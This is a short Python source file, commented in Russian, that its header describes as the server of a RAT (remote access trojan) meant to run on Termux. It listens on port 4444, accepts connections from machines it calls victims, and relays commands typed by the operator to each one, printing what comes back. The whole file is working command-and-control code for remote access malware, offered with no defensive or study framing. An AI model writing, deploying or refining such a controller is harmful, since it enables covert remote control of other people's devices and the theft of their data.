# server.py — RAT сервер, запускается на Termux
import socket, threading, os, sys

def handle_victim(conn, addr):
    print(f"\n[+] 🎯 Подключение от {addr[0]}:{addr[1]}")
    while True:
        try:
            cmd = input(f"\033[92m{addr[0]}> \033[0m")
            if not cmd.strip(): continue
            conn.send(cmd.encode())
            if cmd.lower() in ("exit", "quit"): break
            data = conn.recv(65536)
            if data: print(data.decode(errors="replace"))
        except (ConnectionResetError, BrokenPipeError, OSError):
            print("\n[!] 💀 Соединение разорвано.")
            break
    conn.close()

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 4444))
    s.listen(5)
    print("[*] 🕵️‍♂️ Сервер слушает на порту 4444...")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_victim, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
